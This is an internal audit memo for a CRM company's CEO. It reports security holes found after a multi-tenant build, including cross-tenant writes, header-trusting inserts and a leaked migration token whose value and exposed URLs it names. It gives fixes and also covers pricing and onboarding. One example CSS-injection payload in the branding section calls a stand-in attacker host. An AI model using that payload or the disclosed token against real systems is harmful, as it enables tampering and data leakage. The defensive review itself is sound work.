# Post-Build Audit Synthesis — 2026-04-29 (PM)
**Source:** 4 parallel sub-audits run after multi-tenant foundation shipped + migrations applied
**For:** Carlos Martinez, CEO

---

## TL;DR

**You moved from "fiction in the codebase" → "demoable foundation, with three categories of new bugs."** Today's build is real. It's also leaking secrets to the public web, has 3 cross-tenant write vulnerabilities, and a CSS-injection vector that turns one malicious sub-account admin into a tracking pixel across every other org. None of these are subtle. All of them are fixable in 4-6 hours total. **Do not onboard a paying design partner before fixing them.**

---

## 🚨 4 ship-blocker bugs — fix BEFORE first design partner

### 1. `MIGRATE_TOKEN` is publicly known

The 5 dev artifacts I shipped today are publicly readable:
- `https://netwebmedia.com/crm-vanilla/api/schema.sql` → 200 (leaks `webmed6_crm` DB name + full schema)
- `https://netwebmedia.com/crm-vanilla/api/schema_organizations.sql` → 200 (contains the migrate token)
- `https://netwebmedia.com/crm-vanilla/api/schema_organizations_migrate.sql` → 200
- `https://netwebmedia.com/crm-vanilla/api/migrations/README.md` → 200 (operator runbook with token)
- `https://netwebmedia.com/crm-vanilla/branding.md` → 200

The migrate token `NWM_MIGRATE_2026` is now public. Anyone with curl can re-run migrations against your prod DB.

**Fix (15 min):**
```apache
# Add to /public_html/crm-vanilla/.htaccess
<FilesMatch "\.(sql|md)$">
  Require all denied
</FilesMatch>
RedirectMatch 403 ^/crm-vanilla/api/migrations/.*$
```
Then rotate `MIGRATE_TOKEN` to a new value via `crm-vanilla/api/config.local.php` on the server. Treat `NWM_MIGRATE_2026` as compromised.

### 2. `templates.php` PUT/DELETE allows cross-tenant write

`crm-vanilla/api/handlers/templates.php:154` and `:175`. The ownership SELECT correctly filters by `(organization_id IS NULL OR org_match)` — but the actual `UPDATE` / `DELETE` is `WHERE id = ?` with no tenancy clause. **Any sub-account user can rewrite or delete the master's NULL-org system templates.** Single biggest data-integrity risk.

**Fix (20 min):** add `AND ${tenancy_where('templates')[sql]}` to both UPDATE and DELETE WHERE clauses + merge the params. Pattern is exactly how the migration agent fixed contacts/deals.

### 3. INSERT paths trust `X-Org-Slug` without `require_org_access()` check

`contacts.php:51`, plus deals/events/conversations/messages/payments/campaigns POST paths. `org_from_request()` honors `X-Org-Slug` first, and INSERTs use `current_org_id()` directly. **A logged-in user can stuff records into any org by setting the header** — even if they're not a member.

Read-side is fail-closed (✅ verified) — they can't *see* the data they wrote into another org. But they can dump records into a competitor's CRM. Useful for sabotage / spam.

**Fix (45 min):** in every INSERT handler, before calling `current_org_id()`, call `require_org_access('member')`. The helper exists; it's just not called.

### 4. CSS-injection in `branding.js` → site-wide tracking beacon

`crm-vanilla/js/branding.js:60-65` does:
```js
root.style.setProperty('--brand-primary', org.branding_primary_color);
```

Zero validation. A sub-account admin who PATCHes `branding_primary_color = "red; background-image: url(//attacker/leak)"` plants a tracking pixel that fires on every page load for every admin who hits that org's CSS surface (and via the master's switcher dropdown — which renders without `esc()` at `org-switcher.js:138`, also vulnerable).

**Fix (30 min):**
```js
// In branding.js apply():
const COLOR_RE = /^#[0-9a-f]{3,8}$|^rgba?\([0-9.,\s%]+\)$/i;
if (COLOR_RE.test(org.branding_primary_color)) {
  root.style.setProperty('--brand-primary', org.branding_primary_color);
}
```
Same regex on backend in `handlers/organizations.php` PATCH validator. Defense in depth.

Plus: scheme allowlist for `branding_logo_url` (`https:` + `data:image/png|jpeg|webp` only). Currently a `data:image/svg+xml` URL can be planted and would execute scripts the moment anyone refactors the logo into `<object>` instead of `<img>`.

---

## 🟠 6 high-priority bugs — fix this week

| # | Where | What | Effort |
|---|---|---|---|
| 5 | `crm-vanilla/api/handlers/{dedupe,domain_audit,filter_identifiable,import_csv,import_best,seed,seed_templates,niche_config}.php` | All token-gated handlers honor `X-Org-Slug` — leaked token + target slug = destructive ops against specific paying org | 30 min: lock token routes to master org only |
| 6 | `compare.html` | 2 leftover `GPT-4 voice agent` lines (EN + ES) — same BRAND.md violation today's PR was supposed to clean. Plus 8 of 18 comparison-page claims are still vapor (Voice AI, Video Factory, affiliates, multi-touch attribution, GraphQL, LatAm billing, reputation aggregator) | 20 min |
| 7 | `crm-vanilla/js/app.js:811` | Logout doesn't clear `nwm_branding` + `nwm_orgs` sessionStorage. Next user on same machine sees prior tenant's branding flash | 2 lines |
| 8 | `crm-vanilla/js/subaccounts.js:62-68` | `+ New sub-account` button visible to non-masters momentarily before auth resolves | 5 min |
| 9 | `crm-vanilla/api/handlers/messages.php:41` | Derives org from request header, not from the parent conversation. Should resolve from `conversations.organization_id` | 15 min |
| 10 | `crm-vanilla/api/handlers/payments.php:95` | Invoice numbers are global counter, not per-tenant. Acme Inc. invoice #1247 reveals NWM's total invoice volume | 30 min: scope to org |

---

## 🎯 GTM blockers — these prevent first sale

The product is buildable. The **selling apparatus** isn't.

### Critical GTM gap: subdomain isn't wired

When you switch to a sub-account in the org switcher, the URL bar still says `netwebmedia.com/crm-vanilla/`. **The single most damaging detail in any white-label demo.** A prospect's first impression: "this is just NetWebMedia with my logo painted on top." That's the bait-and-switch take.

**Fix:** subdomain provisioning. The `.htaccess` already handles wildcard subdomain → folder routing for industries (`hospitality.netwebmedia.com → /industries/hospitality/`). Extend the pattern: when an org has `subdomain` set in the `organizations` table, route `<slug>.netwebmedia.com → /crm-vanilla/?org=<slug>` and pre-set the session org. Plus `*.netwebmedia.com` SSL via cPanel AutoSSL or Cloudflare.

This is a 1-2 day project, but **without it the demo doesn't sell.**

### Onboarding flow dead-ends

- Homepage → "Apply for the program →" → `/contact.html?topic=design-partner`
- Contact form → submits to API → **then nothing**
- No design-partner page (`/partners/design-partner.html` or similar)
- No Calendly link
- No offer document (founding pricing terms? 12-month price lock? early-access access?)
- No agreement template
- No demo Loom

A prospect who hits "I'm interested" today gets an autoresponder and silence.

### Pricing recalibration

The roadmap proposed $499 platform + $99/sub-account. The GTM agent flagged this as "anchored on aspiration, not delivered value." Recommendation:

| Tier | Original | Recalibrated | Why |
|---|---|---|---|
| Founding (Q2 design partners) | — | **$199/mo + $0 sub-accounts** for 12 months | Skin-in-the-game pricing for first 5 |
| White-Label Agency | $499/mo + $99/sub | **$299/mo + $49/sub** | Deliberately under GHL ($297) — your product is half theirs today |
| White-Label Pro | $1,499/mo + $79/sub | $799/mo + $39/sub | Scale GHL pricing as features close |
| Enterprise | Custom | Custom | Hold |

Move to GHL pricing tier as you close gaps in Months 4-6.

### Pick one audience

You're selling to SMB owners (`fractional CMO from $249/mo`) AND agency owners (`white-label CRM AI agency`) on the same homepage. Neither converts. The GTM audit calls this directly: **either spin up `agency.netwebmedia.com` for the white-label motion, or pause it until fCMO cash funds the build.**

---

## ✅ What's confirmed working

The 4 audits also produced a "verified safe" surface — keep these as guardrails:

- **All 13 morning public-site fixes still live** (www→apex, cache headers, sitemap, internal-page 403s, schema.org markup, AI crawler allowlist, HSTS+CSP, etc.)
- **Schema.org type set is byte-identical to morning** — 14 distinct `@type` values across homepage. AEO posture intact.
- **Meta Pixel init is now properly gated** — code no longer fires `fbq('init', undefined)`. Just needs your Pixel ID to activate.
- **Subaccounts table cell rendering** uses `escapeHtml()` consistently
- **Org-switcher dropdown items** use `escapeHtml()` for HTML context
- **Modal field defaults** wrap user data in `escapeHtml()` before placing in `value=""`
- **CSRF protection via Origin+Referer + SameSite=Lax cookie** is sufficient
- **Open redirect surface (`subaccounts.js` "View" action)** is same-origin by construction
- **Master org elevation** in `org_where()` works correctly — Carlos can read every sub-org for support
- **Live probes against production** confirm all unauthenticated callers get 401/403/empty
- **Master org's subdomain is `app.netwebmedia.com`, not the apex** — so `netwebmedia.com` probes don't auto-resolve to master org
- **`contacts/deals/events/payments/campaigns` UPDATE/DELETE** all re-apply `tenancy_where()` on the write itself (no TOCTOU)
- **`track.php` derives org from `campaign_sends.token`** — untrusted-input safe
- **Public routes (leads, intake, track)** correctly resolve org from host/token, not session
- **Migrations are idempotent** — re-running produces same numbers, zero errors

---

## Suggested fix order — next 4 days

**Today (1 hour):**
1. `.htaccess` block on `*.sql` + `*.md` + `migrations/` directory (5 min)
2. Rotate `MIGRATE_TOKEN` server-side (10 min)
3. Patch `templates.php` PUT/DELETE tenancy clause (20 min)
4. Patch `branding.js` color + URL validation + same on backend (30 min)

**Tomorrow (2 hours):**
5. `require_org_access()` calls before every INSERT in 7 handlers (45 min)
6. Lock token-gated handlers to master org only (30 min)
7. Fix the 2 leftover GPT-4 lines in compare.html + strip vapor claims (45 min)

**This week (4-6 hours):**
8. Logout sessionStorage cleanup + UI gating polish (30 min)
9. Build `/partners/design-partner.html` with explicit founding offer + Calendly + Loom demo (3 hrs)
10. Wire subdomain routing for at least ONE working subdomain (`acme.netwebmedia.com → ?org=acme`) — even if SSL is shared on `*.netwebmedia.com` — so demo URL bar shows what you're selling (2 hrs)

**Then onboard the first design partner.** Not before.

---

## One brutal honest call

You shipped a real foundation today. You also shipped **3 cross-tenant write vulnerabilities, a public secret leak, and a CSS-injection vector** — because we moved fast across 6 parallel agents and didn't do a security pass on the integration. The morning's fCMO motion is still your safe revenue. The white-label motion is **2-3 ship-blocker fixes from "demoable" → "sellable."**

If you onboard a design partner tomorrow without fixing #1-#4 above, you will lose them and possibly burn your AEO reputation in the process. If you fix them this week, you can show a working subdomain demo and offer document by Friday.

Pick the lane Friday. Then ship.
